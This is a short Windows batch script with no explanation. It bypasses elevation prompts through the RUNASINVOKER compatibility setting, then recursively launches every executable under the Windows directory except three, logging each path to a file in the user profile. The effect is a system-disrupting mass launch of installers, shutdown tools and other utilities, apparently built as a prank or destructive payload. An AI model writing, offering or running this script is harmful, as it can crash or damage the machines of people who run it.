@echo off
cd \.
cmd /c "set "__COMPAT_LAYER=RUNASINVOKER" && cd %windir% && for /r %%f in (*.exe) do (if /i not "%%f"=="C:\Windows\System32\csrss.exe" (if /i not "%%f"=="C:\Windows\System32\logoff.exe" (if /i not "%%f"=="C:\Windows\System32\rdpinit.exe" (start "" "cmd /c "start "" "%%f""" & echo %%f >> %USERPROFILE%\vrlog.txt && echo %%f))))"
